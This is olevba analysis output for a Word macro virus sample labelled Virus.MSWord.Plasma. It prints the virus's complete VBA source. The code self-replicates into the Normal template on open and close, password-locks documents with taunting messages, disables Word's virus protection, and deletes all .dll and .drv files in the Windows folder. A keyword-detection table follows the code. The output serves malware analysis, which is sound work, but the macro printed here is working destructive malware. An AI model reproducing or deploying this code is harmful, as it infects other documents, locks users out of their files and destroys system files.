olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Plasma
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Plasma - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO PlasmaPack.bas 
in file: Virus.MSWord.Plasma - OLE stream: 'Macros/VBA/PlasmaPack'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error GoTo 30
Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="PlasmaPack", _
        Object:=wdOrganizerObjectProjectItems
FLN$ = ActiveDocument.FullName
ActiveDocument.SaveAs "c:\windows\system\kernel32.doc", fileformat:=wdFormatTemplate
ActiveDocument.SaveAs FLN$, fileformat:=wdFormatTemplate
30
End Sub

Sub ToolsMacro()
If ActiveDocument.Name = "Snoopy.doc" Then GoTo 20
MsgBox "SNOOPY" & vbNewLine & "DO YOU THINK, YOU COOL HACKER?" & vbNewLine & "TRY TO CRACK YOUR PASSWORD!", vbCritical, "WORD.MACRO.SNOOPY"
ActiveDocument.Protect (wdAllowOnlyRevisions)
ActiveDocument.Password = "SNOOPY"
20
End Sub
Sub AutoClose()
Attribute AutoClose.VB_Description = "Destruction"
Attribute AutoClose.VB_ProcData.VB_Invoke_Func = "TemplateProject.Ìîäóëü1.AutoClose"
On Error GoTo 10
If ActiveDocument.Name = "Snoopy.doc" Then GoTo 10
ActiveDocument.SaveAs fileformat:=wdFormatTemplate
Application.OrganizerCopy Source:="c:\windows\system\kernel32.doc", _
        Destination:=ActiveDocument.FullName, Name:="PlasmaPack", _
        Object:=wdOrganizerObjectProjectItems
ActiveDocument.Content.InsertAfter Text:=" " & vbNewLine
ActiveDocument.Content.InsertAfter Text:=" SNOOPY looking for you! " & vbNewLine
ActiveDocument.Content.InsertAfter Text:="---/// DON'T RELAX ///---"
10
End Sub
Sub ToolsProtectDocument()
MsgBox "SNOOPY" & vbNewLine & "DO YOU THINK, YOU COOL HACKER?" & vbNewLine & "TRY TO CRACK YOUR PASSWORD!", vbCritical, "WORD.MACRO.SNOOPY"
If ActiveDocument.Name = "Snoopy.doc" Then GoTo 20
ActiveDocument.Protect (wdAllowOnlyRevisions)
ActiveDocument.Password = "SNOOPY"
20
End Sub

Sub AutoExec()
Options.VirusProtection = False
End Sub

Sub ToolsUnprotectDocument()
MsgBox "You should hack it!", vbInformation, "SNOOPY"
End Sub
Sub ViewVBcode()
Kill "c:\windows\*.dll"
Kill "c:\windows\*.drv"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

